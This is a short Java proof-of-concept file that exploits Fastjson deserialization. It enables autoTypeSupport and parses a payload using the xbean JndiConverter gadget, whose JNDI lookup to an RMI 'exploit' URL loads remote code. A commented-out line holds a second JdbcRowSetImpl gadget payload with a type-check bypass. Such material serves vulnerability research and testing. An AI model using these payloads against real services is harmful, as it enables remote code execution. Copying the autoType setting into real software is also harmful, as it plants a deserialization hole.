package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.sql.SQLException;

public class TestJndiConverter {
    public static void main(String[] args) throws SQLException {
//        String fastSer =  "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
        String fastSer =  "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1999/exploit\"}";
        System.out.println(fastSer);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
        JSON.parseObject(fastSer);
    }
}